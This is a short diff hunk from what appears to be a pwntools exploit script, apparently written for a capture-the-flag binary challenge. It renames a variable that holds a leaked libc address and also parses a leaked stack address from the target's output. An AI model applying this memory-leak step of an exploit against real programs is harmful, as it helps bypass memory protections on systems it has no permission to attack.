@@ -38,7 +38,7 @@ p.recvuntil('A'*47+'\n')
 data = p.recv(8)
 log.hexdump(data)
 
-__libc_start_main_241 = u32(data[0:4])
+libc_func_x = u32(data[0:4])
 stack = u32(data[4:8])
 
 # 40:ebp
